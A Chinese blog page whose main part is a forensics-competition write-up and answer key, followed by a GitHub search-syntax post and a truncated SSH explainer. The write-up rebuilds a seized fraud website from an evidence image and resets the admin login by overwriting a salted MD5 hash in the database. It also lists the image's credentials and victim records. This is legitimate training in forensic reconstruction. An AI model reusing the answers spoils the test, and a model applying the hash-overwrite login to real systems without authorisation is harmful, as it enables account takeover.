<h2 id="重构网站"><a href="#重构网站" class="headerlink" title="重构网站"></a>重构网站</h2><p>在宝塔面板-网站中看见网站的域名为  <a target="_blank" rel="noopener" href="http://www.honglian7001.com/">www.honglian7001.com</a></p>
<p><img src="/2023/04/28/%E9%95%BF%E5%AE%89%E6%9D%AF%EF%BC%81%E5%AE%9D%E5%A1%94%E5%8F%96%E8%AF%81writeup/image-20230428183628922.png"></p>
<p>将服务器ip 192.168.184.33  及域名 <code>www.honglian7001.com</code>添加到hosts文件中，</p>
<p><img src="/2023/04/28/%E9%95%BF%E5%AE%89%E6%9D%AF%EF%BC%81%E5%AE%9D%E5%A1%94%E5%8F%96%E8%AF%81writeup/image-20230428183835985.png"></p>
<p>要重构网站，查看服务器历史命令必不可少，从历史命令中看到以下比较重要的命令，依次执行，</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">systemctl stop nginx</span><br><span class="line"></span><br><span class="line">vi /www/wwwroot/www.honglian7001.com/app/database.php   //将其中的hostname更改为服务器ip地址</span><br><span class="line"></span><br><span class="line">systemctl stop firewalld		//这个是最重要的，需要关闭防火墙</span><br></pre></td></tr></table></figure>



<p>重新访问  <code>www.honglian7001.com</code>  发现已经跟之前不一样了，</p>
<p><img src="/2023/04/28/%E9%95%BF%E5%AE%89%E6%9D%AF%EF%BC%81%E5%AE%9D%E5%A1%94%E5%8F%96%E8%AF%81writeup/image-20230429000657566.png"></p>
<p>查看网站目录结构，访问<code>www.honglian7001.com/admin</code> ，进入到后台登录页面，但是我们不知道登录的账号密码</p>
<p><img src="/2023/04/28/%E9%95%BF%E5%AE%89%E6%9D%AF%EF%BC%81%E5%AE%9D%E5%A1%94%E5%8F%96%E8%AF%81writeup/image-20230429000750999.png"></p>
<p>首先去宝塔页面将网站源码下载下来，然后在 <code>www.honglian7001.com_Rnk8S6\www.honglian7001.com\app\admin\common.php</code> 文件中可发现用户密码加密函数，源码如下，</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">password</span>(<span class="params"><span class="variable">$password</span>, <span class="variable">$password_code</span>=<span class="string">&#x27;lshi4AsSUrUOwWV&#x27;</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">md5</span>(<span class="title function_ invoke__">md5</span>(<span class="variable">$password</span>) . <span class="title function_ invoke__">md5</span>(<span class="variable">$password_code</span>));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p>根据加密函数，我们可以自己按照该规则生成一个密码为“123456”的加密值 <code>9eb2b9ad495a75f80f9cf67ed08bbaae</code> ，然后去 <a target="_blank" rel="noopener" href="http://www.honglian7001/">www.honglian7001</a> 数据库中的 app_admin 表中将admin用户的密码替换掉，这样我们就将admin用户的密码更改为 123456</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">password</span>(<span class="params"><span class="variable">$password</span>, <span class="variable">$password_code</span> = <span class="string">&#x27;lshi4AsSUrUOwWV&#x27;</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">md5</span>(<span class="title function_ invoke__">md5</span>(<span class="variable">$password</span>) . <span class="title function_ invoke__">md5</span>(<span class="variable">$password_code</span>));</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span>=<span class="title function_ invoke__">password</span>(<span class="string">&quot;123456&quot;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$a</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//最后输出的结果：9eb2b9ad495a75f80f9cf67ed08bbaae</span></span><br></pre></td></tr></table></figure>



<p><img src="/2023/04/28/%E9%95%BF%E5%AE%89%E6%9D%AF%EF%BC%81%E5%AE%9D%E5%A1%94%E5%8F%96%E8%AF%81writeup/image-20230428233655744.png"></p>
<p>使用 admin:123456 登录后台登录窗口，完美登录！！！</p>
<p><img src="/2023/04/28/%E9%95%BF%E5%AE%89%E6%9D%AF%EF%BC%81%E5%AE%9D%E5%A1%94%E5%8F%96%E8%AF%81writeup/image-20230429001944887.png"></p>
<h1 id="下面就可以开心愉快地做题喽！"><a href="#下面就可以开心愉快地做题喽！" class="headerlink" title="下面就可以开心愉快地做题喽！"></a>下面就可以开心愉快地做题喽！</h1><ol>
<li><p>检材web.E01的操作系统版本是：<em><strong>CentOS Linux release 7.9.2009</strong></em></p>
<p>cat &#x2F;etc&#x2F;centos-release  ，得到操作系统版本</p>
<p><img src="/2023/04/28/%E9%95%BF%E5%AE%89%E6%9D%AF%EF%BC%81%E5%AE%9D%E5%A1%94%E5%8F%96%E8%AF%81writeup/image-20230429093517205.png"></p>
</li>
<li><p>检材web.E01中，操作系统的内核版本是：<em><strong>3.10.0-1160.el7.x86_64</strong></em></p>
<p>uname -a  ，查看内核版本</p>
<p><img src="/2023/04/28/%E9%95%BF%E5%AE%89%E6%9D%AF%EF%BC%81%E5%AE%9D%E5%A1%94%E5%8F%96%E8%AF%81writeup/image-20230429092745472.png"></p>
</li>
<li><p>检材web.E01服务器中，最后一条操作命令为：<em><strong>shutdown now</strong></em></p>
<p>这个需要去取证分析系统中查看，因为在终端里查看，历史命令包括我们配置网络时使用的命令</p>
<p><img src="/2023/04/28/%E9%95%BF%E5%AE%89%E6%9D%AF%EF%BC%81%E5%AE%9D%E5%A1%94%E5%8F%96%E8%AF%81writeup/image-20230429095022088.png"></p>
</li>
<li><p>检材web.E01服务器中，远程连接服务所使用的端口号为：<em><strong>7001</strong></em></p>
<p> netstat -antp  ，查看服务器中使用端口，ssh端口为7001，说明管理员将ssh默认端口更改了</p>
<p><img src="/2023/04/28/%E9%95%BF%E5%AE%89%E6%9D%AF%EF%BC%81%E5%AE%9D%E5%A1%94%E5%8F%96%E8%AF%81writeup/image-20230429095340174.png"></p>
</li>
<li><p>该后台服务器中，在案发前，管理员最后一次登陆服务器的IP地址为（答案格式111.111.111.111）：<em><strong>192.168.72.1</strong></em></p>
<p>last 命令查看登录信息，发现管理员最后一次登录的ip地址</p>
<p><img src="/2023/04/28/%E9%95%BF%E5%AE%89%E6%9D%AF%EF%BC%81%E5%AE%9D%E5%A1%94%E5%8F%96%E8%AF%81writeup/image-20230429102158837.png"></p>
</li>
<li><p>检材web.E01中，嫌疑人架设网站使用了何种工具架设了网站：<em><strong>宝塔</strong></em></p>
<p>在计算机取证分析系统中，可以看到有宝塔面板的信息</p>
<p><img src="/2023/04/28/%E9%95%BF%E5%AE%89%E6%9D%AF%EF%BC%81%E5%AE%9D%E5%A1%94%E5%8F%96%E8%AF%81writeup/image-20230429102334994.png"></p>
</li>
<li><p>接上一题，请问架设网站的工具的登陆用户名为：<em><strong>yun9tinp</strong></em></p>
<p>bt  14 ，命令查看面板默认信息，可以查看到用户名</p>
<p><img src="/2023/04/28/%E9%95%BF%E5%AE%89%E6%9D%AF%EF%BC%81%E5%AE%9D%E5%A1%94%E5%8F%96%E8%AF%81writeup/image-20230429102716125.png"></p>
</li>
<li><p>该后台网站对外提供服务所使用的端口号为：<em><strong>8888</strong></em></p>
<p>这里说的对外提供服务，我理解的是宝塔面板后台，从第7题答案就能做出来</p>
</li>
<li><p>该后台网站所使用的域名为（答案格式：<a target="_blank" rel="noopener" href="http://www.abc.com/">www.abc.com</a>）：***<code>www.honglian7001.com</code>***</p>
<p>直接去宝塔管理页面查看网站信息</p>
<p><img src="/2023/04/28/%E9%95%BF%E5%AE%89%E6%9D%AF%EF%BC%81%E5%AE%9D%E5%A1%94%E5%8F%96%E8%AF%81writeup/image-20230429103312958.png"></p>
</li>
<li><p>请分析该网站的后台登陆地址的url为：<em><strong>暂定</strong></em></p>
<p>这个后台我不太理解是宝塔还是网站的后台登录URL，不过这两个URL都是可以找到的</p>
<p>宝塔后台登录URL：<code>http://192.168.184.33:8888/d42e9f35</code>  </p>
<p>网站后台登录URL：<code>http://www.honglian7001.com/admin/common/login.shtml</code></p>
</li>
<li><p>该网站后台所使用的数据库类型为：<em><strong>mysql</strong></em></p>
<p>这个题目在之前分析history命令的时候就发现了，</p>
<p><img src="/2023/04/28/%E9%95%BF%E5%AE%89%E6%9D%AF%EF%BC%81%E5%AE%9D%E5%A1%94%E5%8F%96%E8%AF%81writeup/image-20230429103957623.png"></p>
<p>当然也可以直接使用  <strong><code>rpm -qa | grep sql</code></strong> 命令查看服务器安装了哪些服务，</p>
<p><img src="/2023/04/28/%E9%95%BF%E5%AE%89%E6%9D%AF%EF%BC%81%E5%AE%9D%E5%A1%94%E5%8F%96%E8%AF%81writeup/image-20230429104521999.png"></p>
<p>有mysql，有sqlite，然后结合历史命令可得网站使用的数据库就是mysql</p>
</li>
<li><p>该网站所使用的数据库的库名（database名）为：<em><strong>www_honglian7001</strong></em></p>
<p>去宝塔面板的数据库中查看</p>
<p><img src="/2023/04/28/%E9%95%BF%E5%AE%89%E6%9D%AF%EF%BC%81%E5%AE%9D%E5%A1%94%E5%8F%96%E8%AF%81writeup/image-20230429104720479.png"></p>
</li>
<li><p>该网站所使用的数据库的root密码为：<em><strong>15dbefa4aae110a5</strong></em></p>
<p>去宝塔数据库中的root密码查看</p>
<p><img src="/2023/04/28/%E9%95%BF%E5%AE%89%E6%9D%AF%EF%BC%81%E5%AE%9D%E5%A1%94%E5%8F%96%E8%AF%81writeup/image-20230429104822507.png"></p>
</li>
<li><p>请计算&#x2F;www&#x2F;wwwroot&#x2F;<a target="_blank" rel="noopener" href="http://www.honglian7001.com/app%E7%9B%AE%E5%BD%95%E4%B8%8B%E7%9A%84%E6%96%87%E4%BB%B6&quot;database.php&quot;%E7%9A%84SHA256%E5%80%BC%EF%BC%9A***091e47e4b3fcd7cd6964066e66f7035f65faf91b90de47c658e10f6b6a371924">www.honglian7001.com/app目录下的文件&quot;database.php&quot;的SHA256值：***091e47e4b3fcd7cd6964066e66f7035f65faf91b90de47c658e10f6b6a371924</a>***</p>
<p>将该文件下载下来，使用<code>CertUtil -hashfile database.php SHA256</code>命令计算文件SHA256值  </p>
<p><img src="/2023/04/28/%E9%95%BF%E5%AE%89%E6%9D%AF%EF%BC%81%E5%AE%9D%E5%A1%94%E5%8F%96%E8%AF%81writeup/image-20230429105308746.png"></p>
</li>
<li><p>已知，该网站后台对于账号的密码采用加盐加密，该salt值为：<em><strong>lshi4AsSUrUOwWV</strong></em></p>
<p>去宝塔中查看网站文件，就可以找到网站登录密码加密规则源码</p>
<p><img src="/2023/04/28/%E9%95%BF%E5%AE%89%E6%9D%AF%EF%BC%81%E5%AE%9D%E5%A1%94%E5%8F%96%E8%AF%81writeup/image-20230430111759482.png"></p>
</li>
<li><p>在对后台账号的密码加密处理过程中，后台一共计算几次MD5值：<em><strong>3</strong></em></p>
<p>从第15题的结果分析，后台总共计算3次MD5值</p>
</li>
<li><p>请问，网站后台的创建时间最早的管理员账号为：<em><strong>yun9tinp</strong></em></p>
<p>宝塔中查看登录用户历史信息，可以找到最早登录的管理员账号</p>
<p><img src="/2023/04/28/%E9%95%BF%E5%AE%89%E6%9D%AF%EF%BC%81%E5%AE%9D%E5%A1%94%E5%8F%96%E8%AF%81writeup/image-20230430115710814.png"></p>
</li>
<li><p>请综合分析并重构网站，本案中受害者张某的最后登陆IP是多少（答案格式111.111.111.111）：<em><strong>192.168.1.101</strong></em></p>
<p><img src="/2023/04/28/%E9%95%BF%E5%AE%89%E6%9D%AF%EF%BC%81%E5%AE%9D%E5%A1%94%E5%8F%96%E8%AF%81writeup/image-20230430170543288.png"></p>
</li>
<li><p>请综合分析并重构网站，本案中嫌疑人所掌握的后台共获取了多少设备记录：<em><strong>6003</strong></em></p>
<p>根据第18题，可以看到 app_user 表中的用户设备记录总共6003条</p>
<p><img src="/2023/04/28/%E9%95%BF%E5%AE%89%E6%9D%AF%EF%BC%81%E5%AE%9D%E5%A1%94%E5%8F%96%E8%AF%81writeup/image-20230430170726053.png"></p>
</li>
<li><p>请综合分析并重构网站，本案中受害者张某的手机型号在后台记录中显示为：<em><strong>HONOR-NTH-AN00</strong></em></p>
<p>仍然是根据第18题，可以看到受害者的手机型号</p>
<p><img src="/2023/04/28/%E9%95%BF%E5%AE%89%E6%9D%AF%EF%BC%81%E5%AE%9D%E5%A1%94%E5%8F%96%E8%AF%81writeup/image-20230430170919832.png"></p>
</li>
<li><p>请综合分析并重构网站，本案中受害者张某的手机通讯录中，名为“许总”的电话号码为（不需要填写空格，答案格式：18811112222）：<em><strong>139 1796 5858</strong></em></p>
<p>在第20题中可以看到受害者张某的用户id为 <strong>8059</strong>，然后在网站中app_mobile表中根据 user_id 查询受害人手机中的通讯录中叫“许总”的电话</p>
<p><img src="/2023/04/28/%E9%95%BF%E5%AE%89%E6%9D%AF%EF%BC%81%E5%AE%9D%E5%A1%94%E5%8F%96%E8%AF%81writeup/image-20230430171637409.png"></p>
</li>
<li><p>请综合分析并重构网站，分析该网站第一次用于诈骗活动的时间（填写到日，格式为：2000-01-01）：<em><strong>2020-05-27</strong></em></p>
<p>查看app_user表，降序排列 login_time ，发现最早登录的时间戳为 <code>1607619794</code> ，</p>
<p><img src="/2023/04/28/%E9%95%BF%E5%AE%89%E6%9D%AF%EF%BC%81%E5%AE%9D%E5%A1%94%E5%8F%96%E8%AF%81writeup/image-20230430173611689.png">时间戳转换为北京时间为   <strong><code>2020-12-11</code></strong> </p>
<p><img src="/2023/04/28/%E9%95%BF%E5%AE%89%E6%9D%AF%EF%BC%81%E5%AE%9D%E5%A1%94%E5%8F%96%E8%AF%81writeup/image-20230430174409626.png"></p>
<p>但是这就是网站第一次诈骗时间吗？不一定的，还需要看一遍数据库中其他地方的诈骗时间，进行比较</p>
<p>在app_content 表中发现有条诈骗信息的发送时间为  <strong><code>2020-05-27</code></strong> ，这个比 <strong><code>2020-12-11</code></strong> 更早，所以正确答案应该是前者</p>
<p><img src="/2023/04/28/%E9%95%BF%E5%AE%89%E6%9D%AF%EF%BC%81%E5%AE%9D%E5%A1%94%E5%8F%96%E8%AF%81writeup/image-20230430175906088.png"></p>
</li>
<li><p>请综合分析并重构网站，分析该网站设定的邀请码为： <em><strong>700001</strong></em></p>
<p>登录到网站后台，就可以看到网站设定的邀请码了</p>
<p><img src="/2023/04/28/%E9%95%BF%E5%AE%89%E6%9D%AF%EF%BC%81%E5%AE%9D%E5%A1%94%E5%8F%96%E8%AF%81writeup/image-20230428233509369.png"></p>
</li>
<li><p>请综合分析并重构网站，分析该网站共记录的通信录数量为：<em><strong>1145085</strong></em></p>
<p>从app_mobile表中可以看到通讯录总数量</p>
<p><img src="/2023/04/28/%E9%95%BF%E5%AE%89%E6%9D%AF%EF%BC%81%E5%AE%9D%E5%A1%94%E5%8F%96%E8%AF%81writeup/image-20230430171735247.png"></p>
</li>
<li><p>请综合分析并重构网站，分析最常登录后台的角色昵称为：<em><strong>zz43</strong></em><br>在app_admin 表中将thumb进行降序排列，第一个就是登录次数最多的用户信息，可看到其用户名</p>
<p><img src="/2023/04/28/%E9%95%BF%E5%AE%89%E6%9D%AF%EF%BC%81%E5%AE%9D%E5%A1%94%E5%8F%96%E8%AF%81writeup/image-20230430180424115.png"></p>
</li>
</ol>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2023/04/28/%E9%95%BF%E5%AE%89%E6%9D%AF%EF%BC%81%E5%AE%9D%E5%A1%94%E5%8F%96%E8%AF%81writeup/" data-id="clh19dc0o0000skv4bj6e36wx" data-title="长安杯！宝塔取证writeup" class="article-share-link">分享</a>
      
      
      
    </footer>
  </div>
  
</article>



  
    <article id="post-Github搜索技巧" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2023/04/18/Github%E6%90%9C%E7%B4%A2%E6%8A%80%E5%B7%A7/" class="article-date">
  <time class="dt-published" datetime="2023-04-18T11:39:22.000Z" itemprop="datePublished">2023-04-18</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/%E5%85%B6%E4%BB%96/">其他</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2023/04/18/Github%E6%90%9C%E7%B4%A2%E6%8A%80%E5%B7%A7/">Github搜索技巧</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <p>近日，GitHub推出了全新的查询语法 ，类似于fofa，shodan，zoomeye这些搜索引擎</p>
<p>官方语法如下：</p>
<h2 id="基本搜索"><a href="#基本搜索" class="headerlink" title="基本搜索"></a><strong>基本搜索</strong></h2><table>
<thead>
<tr>
<th><strong>语法例子</strong></th>
<th><strong>说明</strong></th>
</tr>
</thead>
<tbody><tr>
<td>cat stars:&gt;100</td>
<td>查找拥有100颗以上收藏的包含”猫”存储库</td>
</tr>
<tr>
<td>user:defunkt</td>
<td>获取用户defunkt的所有存储库</td>
</tr>
<tr>
<td>tom location:”San Francisco, CA”</td>
<td>查找所有位于“San Francisco, CA”的tom用户</td>
</tr>
<tr>
<td>join extension:coffee</td>
<td>查找所有在代码中使用coffee扩展的join实例</td>
</tr>
<tr>
<td>NOT cat</td>
<td>排除所有包含cat的结果</td>
</tr>
</tbody></table>
<h2 id="存储库搜索"><a href="#存储库搜索" class="headerlink" title="存储库搜索"></a><strong>存储库搜索</strong></h2><p>存储库搜索会浏览在GitHub上有权访问的项目(。你也可以筛选结果</p>
<table>
<thead>
<tr>
<th><strong>语法例子</strong></th>
<th><strong>说明</strong></th>
</tr>
</thead>
<tbody><tr>
<td>cat stars:&gt;100</td>
<td>查找拥有100颗以上收藏的包含”猫”存储库</td>
</tr>
<tr>
<td>user:defunkt</td>
<td>获取用户defunkt的所有存储库</td>
</tr>
<tr>
<td>pugs pushed:&gt;2013-01-28</td>
<td>查找自2013年1月28日以来推送的Pugs存储库</td>
</tr>
<tr>
<td>node.js forks:&lt;200</td>
<td>查找所有拥有少于200个分支的node.js存储库</td>
</tr>
<tr>
<td>jquery size:1024..4089</td>
<td>查找大小在1024和4089kb之间的jquery存储库</td>
</tr>
<tr>
<td>gitx fork:true</td>
<td>存储库搜索包括gitx的分支</td>
</tr>
<tr>
<td>gitx fork:only</td>
<td>存储库搜索仅返回gitx的分支</td>
</tr>
</tbody></table>
<h2 id="代码搜索"><a href="#代码搜索" class="headerlink" title="代码搜索"></a><strong>代码搜索</strong></h2><p>代码搜索会浏览托管在GitHub上的文件</p>
<table>
<thead>
<tr>
<th><strong>语法例子</strong></th>
<th><strong>说明</strong></th>
</tr>
</thead>
<tbody><tr>
<td>install repo:charles&#x2F;privaterepo</td>
<td>在charles&#x2F;privaterepo存储库中的代码中查找所有install的实例。</td>
</tr>
<tr>
<td>shogun user:heroku</td>
<td>查找所有公共heroku存储库中与shogun相关的引用</td>
</tr>
<tr>
<td>join extension:coffee</td>
<td>查找所有扩展名为coffee的代码中join的实例</td>
</tr>
<tr>
<td>system size:&gt;1000</td>
<td>查找文件大小大于1000kbs的代码中所有system的实例</td>
</tr>
<tr>
<td>examples path:&#x2F;docs&#x2F;</td>
<td>在&#x2F;docs&#x2F;路径中查找所有示例</td>
</tr>
<tr>
<td>replace fork:true</td>
<td>在分支的源代码中搜索replace</td>
</tr>
</tbody></table>
<h2 id="问题搜索"><a href="#问题搜索" class="headerlink" title="问题搜索"></a><strong>问题搜索</strong></h2><p>问题搜索可以查看 GitHub 上的问题和拉取请求</p>
<table>
<thead>
<tr>
<th><strong>语法例子</strong></th>
<th><strong>说明</strong></th>
</tr>
</thead>
<tbody><tr>
<td>encoding user:heroku</td>
<td>Heroku组织中的encoding问题</td>
</tr>
<tr>
<td>cat is:open</td>
<td>查找cat的opne问题</td>
</tr>
<tr>
<td>strange comments:&gt;42</td>
<td>有超过 42 条评论的问题</td>
</tr>
<tr>
<td>hard label:bug</td>
<td>标记为 bug 的困难问题</td>
</tr>
<tr>
<td>author:mojombo</td>
<td>所有由 mojombo 编写的问题</td>
</tr>
<tr>
<td>mentions:tpope</td>
<td>提到 tpope 的所有问题</td>
</tr>
<tr>
<td>assignee:rtomayko</td>
<td>所有分配给 rtomayko 的问题</td>
</tr>
<tr>
<td>exception created:&gt;2012-12-31</td>
<td>自 2013 年初以来异常问题</td>
</tr>
<tr>
<td>exception updated:&lt;2013-01-01</td>
<td>在 2013 年之前的异常问题</td>
</tr>
</tbody></table>
<h2 id="用户搜索"><a href="#用户搜索" class="headerlink" title="用户搜索"></a><strong>用户搜索</strong></h2><p>用户搜索是指在GitHub上查找具有账户的用户</p>
<table>
<thead>
<tr>
<th><strong>语法例子</strong></th>
<th><strong>说明</strong></th>
</tr>
</thead>
<tbody><tr>
<td>fullname:”凌风子虚”</td>
<td>查找全名为”凌风子虚”的用户</td>
</tr>
<tr>
<td>tom location:”San Francisco, CA”</td>
<td>查找在”San Francisco, CA”的所有tom用户</td>
</tr>
<tr>
<td>chris followers:100..200</td>
<td>查找其粉丝数在100到200之间的所有chris用户</td>
</tr>
<tr>
<td>ryan repos:&gt;10</td>
<td>查找其仓库数量超过10个的所有ryan用户</td>
</tr>
</tbody></table>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2023/04/18/Github%E6%90%9C%E7%B4%A2%E6%8A%80%E5%B7%A7/" data-id="clgm7pogp0000eov49dat4wsn" data-title="Github搜索技巧" class="article-share-link">分享</a>
      
      
      
    </footer>
  </div>
  
</article>



  
    <article id="post-ssh原理及使用" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2023/03/19/ssh%E5%8E%9F%E7%90%86%E5%8F%8A%E4%BD%BF%E7%94%A8/" class="article-date">
  <time class="dt-published" datetime="2023-03-19T03:52:39.000Z" itemprop="datePublished">2023-03-19</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/CTF-web-writeup/">CTF_web_writeup</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2023/03/19/ssh%E5%8E%9F%E7%90%86%E5%8F%8A%E4%BD%BF%E7%94%A8/">ssh原理及使用</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <h2 id="SSH简介"><a href="#SSH简介" class="headerlink" title="SSH简介"></a>SSH简介</h2><p><strong>安全外壳协议</strong>（Secure Shell Protocol，简称SSH）是一种建立在应用层基础上的<strong>加密的</strong>网络传输<strong>协议</strong>，主要用来在客户端和服务器之间建立安全通信隧道。使用SSH进行远程登录，信息传输是加密的，即使信息被中途截获也不会泄露。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">注：</span><br><span class="line">* SSH仅仅是一个协议标准，其具体的实现有很多，既有开源实现的OpenSSH，也有商业实现方案。使用范围最广泛的当然是开源实现OpenSSH。</span><br></pre></td></tr></table></figure>



<h2 id="Linux下安装SSH-Server"><a href="#Linux下安装SSH-Server" class="headerlink" title="Linux下安装SSH Server"></a>Linux下安装SSH Server</h2><p>使用SSH时，被登录的主机需要安装并运行SSH Server。SSH实现有很多种，比如在Linux中可以用 OpenSSH：</p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">sudo systemctl status ssh # 可以查看系统是否有ssh server可用</span><br><span class="line">sudo apt-get install openssh-server #安装openssh</span><br><span class="line">sudo systemctl enable ssh</span><br><span class="line">sudo systemctl start ssh</span><br></pre></td></tr></table></figure>



<h2 id="数据加密方式"><a href="#数据加密方式" class="headerlink" title="数据加密方式"></a>数据加密方式</h2><p>对数据进行加密的方式主要有两种：对称加密（密钥加密）和非对称加密（公钥加密）。</p>
<p>对称加密指加密解密使用的是同一套秘钥。Client端把密钥加密后发送给Server端，Server用同一套密钥解密。对称加密的加密强度比较高，很难破解。但是，Client数量庞大，很难保证密钥不泄漏。如果有一个Client端的密钥泄漏，那么整个系统的安全性就存在严重的漏洞。为了解决对称加密的漏洞，于是就产生了非对称加密。非对称加密有两个密钥：“公钥”和“私钥”。<strong>公钥加密后的密文，只能通过对应的私钥进行解密。想从公钥推理出私钥几乎不可能</strong>，所以非对称加密的安全性比较高。</p>
<p>SSH的加密原理中，使用了RSA非对称加密算法。</p>
<h1 id="SSH工作原理"><a href="#SSH工作原理" class="headerlink" title="SSH工作原理"></a>SSH工作原理</h1><p>SSH 协议是基于客户端-服务器模型的，其工作过程如下：</p>
<ol>
<li><p>客户端发起连接请求：首先，用户需要启动一个 SSH 客户端程序，并向服务器发起 SSH 连接请求。连接请求包含服务器的 IP 地址和用户的登录凭据（用户名和密码或 SSH 密钥）。</p>
</li>
<li><p>服务器响应连接请求：一旦服务器收到连接请求，它会检查用户提供的登录凭据。如果凭据验证成功，服务器就会向客户端发送加密的连接确认信息。</p>
</li>
<li><p>客户端和服务器建立加密连接：在收到连接确认信息后，客户端会生成一个随机的会话密钥，用于加密通信。然后，客户端会向服务器发送一个加密的请求，包含会话密钥和其他的连接信息。</p>
</li>
<li><p>SSH 会话开始：一旦客户端和服务器成功建立加密连接，SSH 会话就开始了。在会话期间，客户端可以向服务器发送各种命令和数据，并接收服务器的响应。所有的通信都经过密钥加密，以确保数据安全。</p>
</li>
<li><p>SSH 会话结束：当用户关闭 SSH 客户端程序时，SSH 会话就会结束。客户端程序会清除会话密钥和其他的临时数据，以确保不会有敏感信息留存在客户端。</p>
</li>
</ol>
<p><img src="https://pic2.zhimg.com/80/v2-46e7c27669cd6de13c1373e714ca407d_1440w.webp" alt="img"></p>
<h2 id="远程登录模型"><a href="#远程登录模型" class="headerlink" title="远程登录模型"></a>远程登录模型</h2><p>ssh安全验证原理，简单来说就是SSH Server会有一对密钥，公有密钥(PubKey)和私有密钥(PriKey)。当客户端用户请求连接服务器的ssh时，服务器会把公有密钥作为回应发送给请求连接的用户，私有密钥只在本地保管。然后客户端拿到公有密钥后用其加密目标用户的密码发送给服务器，服务器完成验证后建立连接。</p>
<p>客户端需发送以下命令并输入用户user123的密码即可：</p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh user123@server</span><br></pre></td></tr></table></figure>



<p>大致过程如下图所示：</p>
<p><img src="https://pic2.zhimg.com/80/v2-46e7c27669cd6de13c1373e714ca407d_1440w.webp" alt="img"></p>
<p>整个过程是这样的：<br>（1）远程主机收到用户的登录请求，把自己的公钥发给用户。<br>（2）用户使用这个公钥，将登录密码加密后，发送回来。<br>（3）远程主机用自己的私钥，解密登录密码，如果密码正确，就同意用户登录。</p>
<h2 id="口令登录"><a href="#口令登录" class="headerlink" title="口令登录"></a>口令登录</h2><p>客户端输入以下命令，</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh user123@192.168.254.128</span><br></pre></td></tr></table></figure>



<p>如果是客户端第一次连接服务器，那么在执行上述命令后，客户端会显示   </p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">The authenticity of host &#x27;192.168.254.128 (192.168.254.128)&#x27; can&#x27;t be established.</span><br><span class="line">ED25519 key fingerprint is SHA256:TRtIeYojTIb5o/2C2k8VRN7HrQ3xA8NioVO4H418ykM.</span><br><span class="line">This key is not known by any other names</span><br><span class="line">Are you sure you want to continue connecting (yes/no/[fingerprint])?</span><br></pre></td></tr></table></figure>



<p>并且在输入 yes 之后，经过比对后，如果用户接受这个远程主机的公钥，系统会出现一句提示语：     <strong>Warning: Permanently added ‘192.168.254.128’ (ED25519) to the list of known hosts.</strong></p>
<p>输入 yes 之后，就能连接到远程服务器了。</p>
<h2 id="公钥登录"><a href="#公钥登录" class="headerlink" title="公钥登录"></a>公钥登录</h2><p>使用密码登录，每次都必须输入密码，非常麻烦。好在SSH还提供了公钥登录，可以省去输入密码的步骤。</p>
<p>所谓”公钥登录”，就是用户将自己的公钥储存在远程主机上。登录的时候，远程主机会向用户发送一段随机字符串，用户用自己的私钥加密后，再发回来。远程主机用事先储存的公钥进行解密，如果成功，就证明用户是可信的，直接允许登录shell，不再要求输入密码。</p>
<p>这种方法要求用户必须提供自己的公钥。如果没有现成的，可以直接用ssh-keygen生成一个：</p>
<p>$ssh-keygen</p>
<h2 id="演示口令登录"><a href="#演示口令登录" class="headerlink" title="演示口令登录"></a>演示口令登录</h2><h2 id="演示公钥登录"><a href="#演示公钥登录" class="headerlink" title="演示公钥登录"></a>演示公钥登录</h2><h2 id="安全性问题："><a href="#安全性问题：" class="headerlink" title="安全性问题："></a>安全性问题：</h2><p> <strong>中间人攻击”（Man-in-the-middle attack）</strong></p>
<p>SSH之所以能够保证安全，原因在于它采用了公钥加密，这个过程本身是安全的，但是实际用的时候存在一个风险：</p>
